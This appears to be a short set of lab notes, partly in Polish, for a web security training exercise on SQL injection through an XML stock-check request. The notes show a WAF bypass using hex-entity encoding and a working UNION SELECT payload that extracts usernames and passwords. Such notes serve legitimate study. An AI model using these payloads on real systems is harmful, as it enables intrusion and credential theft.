@@ -1,0 +1,17 @@
+Lab: SQL injection with filter bypass via XML encoding
+
+
+
+1. oryginal
+POST /product/stock
+<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>3</productId><storeId>1</storeId></stockCheck>
+
+2. detekcja:
+<storeId>1+1</storeId>
+<storeId>1 UNION SELECT NULL</storeId>    #WAF DETECTED the ATTACK
+
+3. Bypass the WAF
+Extensions > Hackvertor > Encode > dec_entities/hex_entities. 
+
+4. exploitacja
+<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId>
